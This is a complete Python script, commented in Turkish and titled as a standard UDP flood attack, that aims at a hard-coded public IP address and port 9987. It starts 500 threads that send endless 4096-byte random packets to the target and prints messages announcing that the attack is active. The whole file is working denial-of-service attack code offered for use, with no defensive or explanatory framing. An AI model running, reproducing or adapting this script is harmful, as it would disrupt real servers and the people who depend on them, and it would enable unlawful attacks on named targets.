# MODIE - Standart UDP Flood Saldırı Betiği
import socket
import threading
import random
import time

# --- HEDEF BİLGİLERİ ---
target_ip = "87.248.157.5"
target_port = 9987
# ------------------------

def attack():
    """Sürekli UDP paketi gönderen saldırı fonksiyonu."""
    packet_data = random._urandom(4096)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(packet_data, (target_ip, target_port))
            s.close()
        except:
            pass

print(f"[+] HEDEF KİLİTLENDİ: {target_ip}:{target_port}")
print("[+] 500 İŞ PARÇACIĞI İLE SALDIRI BAŞLATILIYOR...")

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

print("[+] SALDIRI AKTİF.")
